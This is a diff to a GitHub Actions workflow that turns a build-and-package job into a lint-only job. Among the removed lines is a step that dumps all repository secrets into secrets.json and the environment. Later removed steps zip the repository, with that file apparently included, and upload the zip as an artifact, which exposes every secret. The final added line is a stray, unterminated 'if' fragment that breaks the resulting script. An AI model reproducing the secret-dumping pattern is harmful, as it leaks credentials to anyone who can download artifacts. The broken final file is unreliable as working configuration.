@@ -1,11 +1,11 @@
-name: CI
+name: Lint
 
 on:
   # Run this workflow when commits are pushed to `main` and on pull requests targeting `main`.
   push:
-    branches: [ main ]
+    branches: [main]
   pull_request:
-    branches: [ main ]
+    branches: [main]
   workflow_dispatch: # Allow manual triggering from the Actions tab
 
 concurrency:
@@ -17,8 +17,8 @@ concurrency:
   cancel-in-progress: true
 
 jobs:
-  build:
-    name: Build, Lint and Package
+  lint:
+    name: Lint
     runs-on: ubuntu-latest
 
     steps:
@@ -34,7 +34,6 @@ jobs:
         # Cache node modules and the npm cache to speed up repeated runs. The
         # cache key includes hashes of `package-lock.json` and `package.json` so
         # the cache is invalidated automatically when dependencies change.
-
         uses: actions/cache@v4
         with:
           path: |
@@ -45,15 +44,7 @@ jobs:
           restore-keys: |
             ${{ runner.os }}-node-
 
-      - name: Cache Next.js build cache
-        uses: actions/cache@v4
-        with:
-          path: .next/cache
-          key: ${{ runner.os }}-next-${{ hashFiles('**/package-lock.json') }}-${{ hashFiles('**/package.json') }}
-          restore-keys: |
-            ${{ runner.os }}-next-
-
-      - name: Install dependencies # Use npm ci when a lockfile is present, otherwise fall back to npm install
+      - name: Install dependencies
         run: |
           if [ -f package-lock.json ]; then
             npm ci
@@ -61,44 +52,6 @@ jobs:
             npm install
           fi
 
-      - name: Lint (treat as test)
+      - name: Run ESLint
         run: npm run lint
-
-      - name: Prepare ALL_SECRETS JSON # Serialize all repository secrets into one JSON file environment variable
-        run: | # This step uses toJson(secrets) to capture all repository secrets into a single JSON object, then strips newlines for safe storage in an env var.
-          echo '${{ toJson(secrets) }}' > secrets.json
-          for key in $(jq -r 'keys[]' secrets.json); do
-            value=$(jq -r --arg k "$key" '.[$k]' secrets.json)
-            echo "$key=$value" >> $GITHUB_ENV
-          done
-
-      - name: Build
-        run: npm run build
-          
-      - name: Ensure zip is available
-        # On some runner images `zip` may not be installed by default. Install
-        # it to ensure the packaging step works reliably.
-        run: |
-          if ! command -v zip >/dev/null 2>&1; then
-            sudo apt-get update && sudo apt-get install -y zip
-          fi
-
-      - name: Create repository zip archive
-        # Create a zip of the full repository contents excluding `.git` and
-        # `node_modules` to avoid enormous archives. The file is named with
-        # the short commit SHA so multiple runs don't overwrite the same file.
-        run: |
-          SHORT_SHA=$(git rev-parse --short HEAD)
-          ZIP_NAME=project-${SHORT_SHA}.zip
-          # -r recurse, -x exclude patterns. We exclude .git and node_modules.
-          zip -r "$ZIP_NAME" . -x "./.git/*" "./node_modules/*"
-          echo "ZIP_NAME=$ZIP_NAME" >> $GITHUB_ENV
-
-      - name: Upload zip artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: project-qol-frontend-zip
-          # Use a glob so we can upload the generated zip without relying on
-          # GitHub Actions environment variable interpolation in the YAML path.
-          path: project-*.zip
-            
+          if [ -f package-lock.json ]; then
